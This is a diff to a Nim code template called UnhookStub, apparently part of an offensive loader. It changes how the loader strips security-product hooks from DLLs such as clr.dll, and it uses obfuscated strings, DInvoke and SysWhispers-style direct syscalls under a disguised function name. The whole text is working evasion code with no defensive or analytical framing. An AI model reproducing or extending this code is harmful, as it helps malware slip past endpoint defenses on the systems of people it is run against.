@@ -889,10 +889,10 @@ let UnhookStub * = """
     proc unhook(dllName: string): bool =
         let low: uint16 = 0
         var processH = -1
-
-        if(dllName == obf("clr.dll")):
-            clrStart()
-            Sleep(2500)
+        when defined(unhookclr):
+            if(dllName == obf("clr.dll")):
+                clrStart()
+                Sleep(2500)
 
         when defined(DInvoke):
             var ntdllModule = MyGetModuleHandleA(dllName)
@@ -957,6 +957,12 @@ let UnhookStub * = """
                 var bytesWritten: SIZE_T
                 var ds: LPVOID = ntdllBase + hookedSectionHeader.VirtualAddress
                 var pSize: SIZE_T = cast[SIZE_T](hookedSectionHeader.Misc.VirtualSize)
+                when defined(unhookclr):
+                    if(dllName == obf("clr.dll")):
+                        # we dont want to touch the first 16kB, so we modify from ds + 0x4000
+                        ds = ds + 0x4000
+                        pSize = pSize - 0x4000
+                        ntdllMappingAddress = ntdllMappingAddress + 0x4000
                 when defined(SysWhispers):
                     status = uashdiasdj(processH, &ds, &pSize, 0x04, &oldProtection)
                     if status != 0:
